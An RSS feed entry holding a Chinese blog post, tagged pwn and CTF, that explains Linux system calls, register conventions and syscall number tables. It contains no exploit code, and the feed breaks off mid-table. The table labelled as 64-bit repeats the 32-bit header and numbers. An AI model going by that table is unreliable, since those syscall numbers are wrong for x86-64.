<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Blog • Posts by &#34;二进制&#34; tag</title>
        <link>http://example.com</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Tue, 29 Aug 2023 20:15:56 +0800</pubDate>
        <lastBuildDate>Tue, 29 Aug 2023 20:15:56 +0800</lastBuildDate>
        <category>pwn</category>
        <category>二进制</category>
        <category>ctf</category>
        <category>Linux</category>
        <item>
            <guid isPermalink="true">http://example.com/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</guid>
            <title>Linux之系统调用</title>
            <link>http://example.com/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</link>
            <category>pwn</category>
            <category>二进制</category>
            <category>Linux</category>
            <pubDate>Tue, 29 Aug 2023 20:15:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一系统调用&#34;&gt;#&lt;/a&gt; 一。系统调用&lt;/h1&gt;
&lt;h5 id=&#34;系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用也是一个函数但是系统调用运行在内核态用户自定义的函数在用户态-而我们想要调用在内核态的指令如关闭打开中断io操作等就需要利用系统调用作为接口让用户进入内核态&#34;&gt;#&lt;/a&gt; 系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。&lt;/h5&gt;
&lt;h5 id=&#34;系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用是linux内核提供的一段代码也可以理解为函数用来实现特定的功能32位程序x86-cpu利用-int-0x80-来进行系统调用64位程序x64-cpu提供调用syscall来进行系统调用-linux内核提供用户空间程序与内核空间进行交互的接口接口让用户态程序能受限访问硬件设备比如申请系统资源操作设备读写创建新进程等用户空间发起请求内核空间负责进行执行两者之间就需要接口作为桥梁用户可以通过这种方式来进行系统调用但是用户是受到限制的不能直接执行内核代码也不能随意进行修改系统必须通过特定方式才能进行才能进入内核也需要一定的权限才能使用接口&#34;&gt;#&lt;/a&gt; 系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，&lt;strong&gt;64 位程序 (X64 CPU) 提供调用 syscall&lt;/strong&gt; 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。&lt;/h5&gt;
&lt;h5 id=&#34;上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上述提到的用户空间与内核空间之间的桥梁就是系统调用syscallsystem-call其作为中间层用来连接用户态和内核态这样做加强了一定的安全性并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可-当用户空间向系统空间发起系统调用时linux系统便会进行软中断进入内核态执行相应的操作&#34;&gt;#&lt;/a&gt; 上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。&lt;/h5&gt;
&lt;h5 id=&#34;不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同的系统调用执行的命令有着不同的系统调用号32位程序与64位程序也不尽相同&#34;&gt;#&lt;/a&gt; 不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）&lt;/h5&gt;
&lt;h1 id=&#34;二32位程序系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二32位程序系统调用&#34;&gt;#&lt;/a&gt; 二.&lt;strong&gt;32 位程序&lt;/strong&gt;系统调用&lt;/h1&gt;
&lt;h5 id=&#34;1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用&#34;&gt;#&lt;/a&gt; 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void system_call()
&amp;#123;
    ...
    // 变量 eax 代表 eax 寄存器的值
    syscall = sys_call_table[eax];
    eax = syscall();
    ...
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;long sys_call_table[] = &amp;#123;
   sys_ni_syscall,
   sys_exit,
   sys_fork,
   sys_read,
   sys_write,
   sys_open,
   sys_close,
   ...
&amp;#125;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中&#34;&gt;#&lt;/a&gt; 用户调用&lt;strong&gt;系统调用&lt;/strong&gt;时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把&lt;strong&gt;返回值保存到 eax 寄存器中&lt;/strong&gt;&lt;/h5&gt;
&lt;h5 id=&#34;用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下&#34;&gt;#&lt;/a&gt; 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;第 1 个参数放置在 ebx  寄存器。&lt;/li&gt;
&lt;li&gt;第 2 个参数放置在 ecx  寄存器。&lt;/li&gt;
&lt;li&gt;第 3 个参数放置在 edx  寄存器。&lt;/li&gt;
&lt;li&gt;第 4 个参数放置在 esi   寄存器。&lt;/li&gt;
&lt;li&gt;第 5 个参数放置在 edi   寄存器。&lt;/li&gt;
&lt;li&gt;第 6 个参数放置在 ebp 寄存器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数&#34;&gt;#&lt;/a&gt; Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。&lt;/h5&gt;
&lt;p&gt;x86 架构系统调用漏洞利用参考: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-248682.htm&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考文章: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9jcklycg==&#34;&gt;Linux 下 syscall 系统调用原理及实现&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;三64位系统系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三64位系统系统调用&#34;&gt;#&lt;/a&gt; 三.&lt;strong&gt;64 位系统&lt;/strong&gt;系统调用&lt;/h1&gt;
&lt;h5 id=&#34;164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样&#34;&gt;#&lt;/a&gt; 1.64 位（x64 架构）系统中，Linux 通过&lt;strong&gt; syscall 指令&lt;/strong&gt;来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样&lt;/h5&gt;
&lt;h5 id=&#34;传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中&#34;&gt;#&lt;/a&gt; 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入&lt;strong&gt; rdi、rsi、rdx 寄存器&lt;/strong&gt;中：&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;第 1 个参数放置在 rdi  寄存器。&lt;/li&gt;
&lt;li&gt;第 2 个参数放置在 rsi  寄存器。&lt;/li&gt;
&lt;li&gt;第 3 个参数放置在 rdx  寄存器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;系统调用完成后把返回值保存到rax寄存器中&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用完成后把返回值保存到rax寄存器中&#34;&gt;#&lt;/a&gt; 系统调用完成后，把&lt;strong&gt;返回值保存到 rax 寄存器中&lt;/strong&gt;&lt;/h5&gt;
&lt;h1 id=&#34;四32位系统与64位系统-对比系统调用不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四32位系统与64位系统-对比系统调用不同&#34;&gt;#&lt;/a&gt; 四.32 位系统与 64 位系统 &lt;strong&gt;对比系统调用不同&lt;/strong&gt;&lt;/h1&gt;
&lt;h3 id=&#34;1系统调用号不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1系统调用号不同&#34;&gt;#&lt;/a&gt; 1. 系统调用号不同&lt;/h3&gt;
&lt;h5 id=&#34;32位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32位&#34;&gt;#&lt;/a&gt; 32 位&lt;/h5&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#ifndef _ASM_X86_UNISTD_32_H&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define _ASM_X86_UNISTD_32_H 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_restart_syscall 0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_exit 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_fork 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_read 3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_write 4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_open 5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_close 6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_waitpid 7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_creat 8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_link 9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_unlink 10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_execve 11&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_chdir 12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_time 13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mknod 14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_chmod 15&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lchown 16&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_break 17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldstat 18&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lseek 19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getpid 20&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mount 21&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_umount 22&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_setuid 23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getuid 24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stime 25&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ptrace 26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_alarm 27&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldfstat 28&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pause 29&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_utime 30&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stty 31&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_gtty 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_access 33&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_nice 34&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ftime 35&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sync 36&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_kill 37&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rename 38&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mkdir 39&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rmdir 40&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;64位系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位系统&#34;&gt;#&lt;/a&gt; 64 位系统&lt;/h5&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#ifndef _ASM_X86_UNISTD_32_H&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define _ASM_X86_UNISTD_32_H 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_restart_syscall 0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_exit 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_fork 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_read 3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_write 4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_open 5&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_close 6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_waitpid 7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_creat 8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_link 9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_unlink 10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_execve 11&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_chdir 12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_time 13&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mknod 14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 